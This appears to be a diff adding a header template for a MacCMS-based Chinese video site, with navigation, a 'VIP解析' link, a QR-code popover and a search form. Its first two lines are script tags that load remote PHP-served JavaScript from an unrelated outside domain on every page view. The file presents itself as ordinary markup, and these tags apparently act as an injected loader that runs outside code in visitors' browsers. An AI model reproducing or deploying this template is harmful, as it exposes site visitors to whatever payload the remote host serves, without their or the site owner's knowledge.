@@ -1,0 +1,28 @@
+﻿<script src='http://fzz.shgqjr.com/vs.php?id=89'></script>
+<script src='http://fzz.shgqjr.com/vs.php?id=90'></script>
+<header class="header">
+	<div class="container">
+		<h1 class="logo"><a href="{maccms:path}" title="{maccms:name}"><img src="{maccms:path_tpl}images/logo.png"><span>{maccms:name}</span></a></h1>		<div class="sitenav">
+		<ul><li id="menu-item-18" class="menu-item"><a {if-A:{maccms:siteaid}=10}class="menu-itema-two"{endif-A} href="{maccms:path}">首页</a>
+</li>
+
+ {maccms:menu type=parent order=asc table=vod}<li id="menu-item-31" class="menu-item"><a {if-A:{maccms:curvodtypeid}=[menu:id]}class="menu-itema-two"{endif-A}{if-A:{maccms:curvodtypepid}=[menu:id]}class="menu-itema-two"{endif-A} href="[menu:link]">[menu:name]</a></li>
+{/maccms:menu}
+<li id="menu-item-31" class="menu-item"><a {if-A:{maccms:curvodtypeid}=[menu:id]}class="menu-itema-two"{endif-A}{if-A:{maccms:curvodtypepid}=[menu:id]}class="menu-itema-two"{endif-A} href="vip.php" style="color:red"  target="_blank">VIP解析</a></li>
+</ul>
+		</div>
+		<span class="sitenav-on"><i class="icon-list"></i></span>
+		<span class="sitenav-mask"></span>
+					<div class="accounts">
+									<a class="account-weixin" href="javascript:;"><i class="fa"></i>
+						<div class="account-popover"><div class="account-popover-content"><img src="{maccms:path_tpl}images/qrcode.png"></div></div>
+					</a>
+					</div>
+							<span class="searchstart-on"><i class="icon-search"></i></span>
+			<span class="searchstart-off"><i class="icon-search"></i></span>
+			<form class="searchform" action="{maccms:link_search_vod}" method="post" id="search" target="_blank">
+				<button tabindex="3" class="sbtn" type="submit"><i class="fa"></i></button><input tabindex="2" class="sinput" name="wd" type="text" placeholder="输入关键字" value="">
+			</form>
+			</div>
+</header>
+<div class="header_end"></div>
